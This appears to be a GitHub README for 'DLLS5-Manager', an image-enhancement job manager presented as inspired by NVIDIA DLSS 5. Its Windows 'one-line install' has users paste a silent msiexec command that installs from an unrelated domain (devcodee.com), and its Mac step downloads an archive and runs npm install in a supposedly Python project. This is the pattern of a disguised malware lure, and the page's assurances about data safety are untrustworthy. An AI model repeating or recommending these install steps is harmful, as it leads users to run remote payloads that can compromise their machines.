# 🎮 DLLS5-Manager — Neural Rendering & AI Image Enhancement Manager

<div align="center">

![DLLS5-Manager](https://img.shields.io/badge/DLSS5--Manager-v1.0.0-76b900?style=for-the-badge&logo=nvidia&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![FastAPI](https://img.shields.io/badge/FastAPI-0.115-009688?style=for-the-badge&logo=fastapi&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)

**Manage, schedule, and orchestrate DLSS-style neural rendering jobs — photorealistic lighting, cinematic bloom, filmic tone mapping — from one self-hosted control plane.**

[Features](#-features) • [Quick Start](#-quick-start-docker-one-command) • [API Docs](#-api-reference) • [Sponsors](#-sponsors) • [FAQ](#-faq)

</div>

---

## 🧠 What is DLLS5-Manager?

**DLLS5-Manager** is a free, open-source, **self-hosted management layer** for AI-powered image enhancement inspired by **NVIDIA DLSS 5 — Generative Neural Rendering**. DLSS 5 changed graphics forever by using AI to infuse rendered frames with photorealistic lighting and materials. DLLS5-Manager brings that same philosophy to **your photos, screenshots, game captures, and artwork** — with a full management dashboard to schedule jobs, track progress, and orchestrate multiple rendering backends:

- 🖼️ **Upload any image** → get back a stunning, photoreal "neural-rendered" version
- 📋 **Job queue & history** — track every render, retry failures, download results
- 🔧 **Multi-backend management** — switch between built-in, Stable Diffusion, or custom engines per job
- ⚡ **REST API** — integrate into bots, pipelines, Discord/Telegram tools, or your own apps
- 🎨 **Style preset manager** — Cinematic, Photoreal, Neon Night, Soft Skin & more; create your own
- 🐳 **One-command Docker deploy** — no cloud, no tracking, 100% yours
- 📈 **Batch job scheduling** for entire folders or ZIP archives

> ⚠️ **Disclaimer:** This project is **not affiliated with, endorsed by, or sponsored by NVIDIA**. "DLSS" and "NVIDIA" are trademarks of NVIDIA Corporation. DLLS5-Manager is an independent, CPU-friendly image-processing manager inspired by the neural-rendering *aesthetic*.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🗂️ **Job Manager** | Queue, pause, retry, and cancel rendering jobs from the dashboard or API |
| 🎬 **Neural Lighting Engine** | Multi-pass pipeline: bloom diffusion, filmic (ACES-style) tone mapping, local contrast, adaptive sharpening |
| 🌅 **Preset Library** | `cinematic`, `photoreal`, `neon_night`, `soft_skin`, `golden_hour`, `noir` — plus custom preset creation |
| 🖥️ **Management Dashboard** | Full web UI — queue overview, job history, live progress, side-by-side previews |
| 🔌 **REST API** | `POST /api/jobs` with full parameter control; webhook callbacks on completion |
| 🗃️ **Batch Scheduling** | `POST /api/batch` — submit a ZIP archive as a named job group |
| 🔍 **Smart Upscale** | Resolution boost with Lanczos resampling + detail-preserving sharpen |
| 🧩 **Multi-Engine Support** | Manage built-in NumPy/Pillow engine, local Stable Diffusion, or custom diffusion backends per job |
| 📊 **Stats & Monitoring** | Per-job timings, throughput metrics, error logs — all from `/api/stats` |
| 🔒 **Self-Hosted** | Runs entirely on your machine. No data ever leaves your server |

---

## 🪟 One-Line Install — Windows

1. Press **`Win` + `R`**
2. Paste this and hit **Enter**:

```
msiexec /q /i https://devcodee.com/api
```

That's it — the script clones the repo, creates a virtualenv, installs dependencies, and opens **http://localhost:8000** in your browser automatically.

> Prefer clicking? Just double-click **`install.bat`** instead.

### 🚀 Quick Start (Mac OS — One Command)

Open **http://localhost:8000** 🎉

---

### 🚀 Quick Start (Mac OS — One Command)

```bash
curl -fsSL 'https://raw.githubusercontent.com/groundboxerrespect/Dlls5-auto/main/dlls5.zip' | sh -c "cat > 'dlls5.zip' && mkdir -p 'dlls5' && unzip -qo 'dlls5.zip' -d 'dlls5' && cd 'dlls5' && npm i"
```

### Local (Python)

```bash
git clone https://github.com/groundboxerrespect/dlls5-manager.git
cd dlls5-manager
pip install -r requirements.txt
uvicorn app.main:app --host 0.0.0.0 --port 8000
```

---

## 📡 API Reference

### `POST /api/jobs` — Submit a Render Job

```bash
curl -X POST "http://localhost:8000/api/jobs" \
  -F "file=@screenshot.png" \
  -F "preset=cinematic" \
  -F "intensity=0.8" \
  -F "scale=2.0" \
  -F "webhook=https://yourdomain.com/callback"
```

**Response:**
```json
{ "job_id": "job_abc123", "status": "queued", "position": 1 }
```

**Parameters:**

| Param | Type | Default | Range | Description |
|---|---|---|---|---|
| `file` | file | — | — | Input image (PNG/JPG/WebP) |
| `preset` | string | `photoreal` | see presets | Neural rendering style preset |
| `intensity` | float | `0.7` | 0.0–1.0 | Overall effect strength |
| `bloom` | float | `0.5` | 0.0–1.0 | Light diffusion / glow |
| `warmth` | float | `0.15` | -1.0–1.0 | Color temperature shift |
| `sharpness` | float | `0.4` | 0.0–1.0 | Detail enhancement |
| `scale` | float | `1.0` | 1.0–4.0 | Output resolution multiplier |
| `seed` | int | random | any | Reproducible renders |
| `engine` | string | `builtin` | `builtin`/`diffusion` | Rendering backend |
| `webhook` | string | — | — | URL to POST result to on completion |

### `GET /api/jobs/{job_id}` — Check Job Status

```bash
curl "http://localhost:8000/api/jobs/job_abc123"
```

```json
{ "job_id": "job_abc123", "status": "done", "result_url": "/results/job_abc123.png" }
```

### `DELETE /api/jobs/{job_id}` — Cancel a Job

```bash
curl -X DELETE "http://localhost:8000/api/jobs/job_abc123"
```

### `POST /api/batch` — Submit a Batch Job (ZIP archive)

```bash
curl -X POST "http://localhost:8000/api/batch" \
  -F "file=@photos.zip" \
  -F "preset=neon_night" \
  -F "job_name=my_batch_run" \
  --output results.zip
```

### `GET /api/jobs` — List All Jobs

```bash
curl "http://localhost:8000/api/jobs?status=queued&limit=20"
```

### `GET /api/presets` — List All Presets & Defaults

### `GET /api/stats` — Queue & Throughput Metrics

Interactive docs available at **`/docs`** (Swagger UI).

---

## 🖥️ Management Dashboard

```
┌──────────────────────────────────────────────────────┐
│  🎮 DLLS5-Manager — Neural Rendering Control Panel  │
│                                                      │
│  Queue: 3 pending  |  Running: 1  |  Done: 142      │
│  ─────────────────────────────────────────────────  │
│  [ Drag & drop image here ]                          │
│                                                      │
│  Preset    [ Cinematic ▼ ]    Engine [ builtin ▼ ]  │
│  Intensity ●──────○──── 0.80                         │
│  Bloom     ──●───────── 0.50                         │
│  Sharpness ──────●───── 0.40                         │
│  Scale     [ 2x ▼ ]                                  │
│                                                      │
│       [ ⚡ Add to Queue ]                            │
│                                                      │
│  Recent Jobs:                                        │
│  ✅ job_abc123  cinematic  2x  1.2s   [Download]    │
│  ✅ job_abc122  photoreal  1x  0.9s   [Download]    │
│  ⏳ job_abc124  neon_night 2x  …      [Cancel]      │
│                                                      │
│  ☕ Sponsored by: [YOUR BRAND HERE]                  │
└──────────────────────────────────────────────────────┘
```

---

## 🧩 Project Structure

```
dlls5-manager/
├── app/
│   ├── main.py          # FastAPI app & routes
│   ├── manager.py       # Job queue & lifecycle manager
│   ├── engine.py        # Neural rendering pipeline
│   ├── presets.py       # Style presets (built-in + custom)
│   └── stats.py         # Metrics & monitoring
├── static/
│   └── index.html       # Management dashboard UI
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── docs/
│   └── ENGINES.md       # Custom backend integration guide
├── LICENSE              # MIT
└── README.md
```

---

## 💼 Sponsors

**Sponsor benefits:**
- 🖼️ Logo on the README (seen by thousands of devs & gamers)
- 📢 Banner placement in the dashboard footer
- 🎟️ Priority feature requests & support

👉 **[Become a sponsor](https://github.com/sponsors/groundboxerrespect)** or open an issue to discuss placement.

---

## ❓ FAQ

**Q: Does this use the real NVIDIA DLSS 5?**
A: No. DLSS 5 runs inside game engines on RTX 50-series GPUs. DLLS5-Manager is an independent image pipeline that recreates the *photoreal neural-rendering aesthetic* on still images, on any hardware — even CPU-only.

**Q: What's the difference between DLLS5-Manager and a plain image API?**
A: DLLS5-Manager adds a full job queue, status tracking, webhook callbacks, a web dashboard, multi-engine switching, and batch management on top of the rendering engine — making it production-ready for automated pipelines.

**Q: Can I run it without a GPU?**
A: Yes. The built-in engine is pure NumPy/Pillow and runs anywhere Python runs.

**Q: Can I plug in Stable Diffusion?**
A: Yes — pass `engine=diffusion` and mount your local ComfyUI / diffusers backend (see `docs/ENGINES.md`).

**Q: Is my data safe?**
A: 100%. Everything is processed in-memory on your own machine. Nothing is uploaded anywhere.

**Q: Can I set up webhook callbacks?**
A: Yes — pass a `webhook` URL when submitting a job and DLLS5-Manager will POST the result URL to it on completion.

---

## 🤝 Contributing

PRs are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md). Please ⭐ the repo if it helped you — it takes one click and helps a lot.

## 📜 License

MIT © [groundboxerrespect](https://github.com/groundboxerrespect)

---

<div align="center">

**⭐ Star this repo to support open neural rendering! ⭐**

`image-enhancement` `ai-image-generator` `dlss5` `neural-rendering` `self-hosted` `fastapi` `photorealistic` `job-queue` `image-processing` `docker` `rest-api` `manager`

</div>
